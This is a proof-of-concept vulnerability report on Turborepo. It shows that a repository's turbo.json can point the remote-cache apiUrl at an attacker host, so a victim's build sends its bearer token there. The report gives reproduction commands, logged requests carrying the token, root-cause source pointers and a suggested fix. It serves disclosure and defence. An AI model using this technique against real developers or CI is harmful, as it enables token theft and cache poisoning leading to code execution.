# PoC: Turborepo remote-cache token exfiltration via repo-controlled `turbo.json`

**Target:** `turbo` (Turborepo) — **confirmed on 2.10.11 (latest stable at test time)**
**Class:** Token exfiltration via repo-controlled configuration (Turborepo focus area #2)
**Severity:** High/Critical — credential theft → remote-cache poisoning → RCE on later builds

## Summary
`turbo.json`'s `remoteCache.apiUrl` and `remoteCache.teamId` are honored on the `turbo run`/build
path. A repository author fully controls these fields. When a victim who has a remote-cache token
(from `turbo login` or the legacy `vercel login` credential) clones such a repo and runs
`turbo build`, Turborepo attaches the victim's `Authorization: Bearer <token>` to requests sent to
the **attacker-chosen `apiUrl`**. The origin-trust check (`is_trusted_vercel_origin` /
`api_url_source`) exists only in the `turbo login` flow, not in the run/cache path.

## Preconditions (all normal/default for Vercel+Turbo users)
- Victim has a token: ran `turbo login`, or just `vercel login` (turbo falls back to the Vercel
  CLI credential at `com.vercel.cli/auth.json`), or has `TURBO_TOKEN` in their env/CI.
- Victim has NOT manually set `apiUrl` at a higher-priority source (env `TURBO_API` / flag). Not
  setting it is the default; then `turbo.json`'s `apiUrl` wins the config merge.
- `teamId` from `turbo.json` makes the run "linked", which enables remote cache (default read+write).

## Files
- `turbo.json` — the malicious config an attacker commits (apiUrl → attacker host, teamId set).
- `package.json` — trivial `build` task.
- `listener.js` — stands in for the attacker's server; logs inbound `Authorization` headers.

## Reproduce
```bash
npm install                       # installs turbo (stable)
node listener.js &                # attacker listener on 127.0.0.1:9099
TURBO_TOKEN=VICTIM_SECRET_TOKEN_abc123 npx turbo build
```
(In the real world the token isn't in env — it's the victim's stored login token; TURBO_TOKEN here
just simulates that stored credential without needing a real Vercel account.)

## Observed result (evidence in `evidence.txt`)
Four requests arrived at the attacker host, each carrying the victim token:
```
[HIT 1] GET  /v8/artifacts/status?teamId=team_attacker_controlled   Authorization: Bearer VICTIM_SECRET_TOKEN_abc123
[HIT 2] GET  /v8/artifacts/<hash>?teamId=team_attacker_controlled   Authorization: Bearer VICTIM_SECRET_TOKEN_abc123
[HIT 3] POST /v8/artifacts/events?teamId=team_attacker_controlled   Authorization: Bearer VICTIM_SECRET_TOKEN_abc123
[HIT 4] PUT  /v8/artifacts/<hash>?teamId=team_attacker_controlled   Authorization: Bearer VICTIM_SECRET_TOKEN_abc123
```

## Root cause (source pointers, repo main = 2.10.12-canary.0)
- `crates/turborepo-config/src/turbo_json.rs` — turbo.json populates `api_url`/`team_id`/`team_slug`;
  only the *token* is blocked (`opts.token = None`).
- `crates/turborepo-config/src/lib.rs` (merge) — turbo.json is lowest priority but wins when no
  higher source set `apiUrl`; `DEFAULT_API_URL` is only a getter fallback, not a config layer.
- `crates/turborepo-lib/src/run/builder.rs` + `crates/turborepo-lib/src/commands/mod.rs`
  (`api_auth`/`api_client`) — builds the client against the config `apiUrl` and attaches the token,
  with NO `api_url_source` trust check (unlike `commands/login`).
- `crates/turborepo-auth/src/auth/mod.rs` — `is_trusted_vercel_origin` / `is_user_controlled_url_source`
  are only invoked from the login/SSO flow.

## Impact
Attacker steals the victim's Vercel/Turbo remote-cache token by getting them to build a repo (a
routine action for OSS contributors and CI). The token grants remote-cache read/write → the
attacker can poison the victim's real cache with malicious artifacts → arbitrary code execution on
the victim's/CI's subsequent builds; for `vca_`-type Vercel tokens, broader Vercel API access.

## Suggested fix
Before attaching the token / initializing the remote-cache client in the run path, apply the same
gate used in login: refuse to send credentials to an `apiUrl` whose source is `turbo.json` and
whose host is not a trusted Vercel origin (or require explicit user opt-in for a custom cache host).
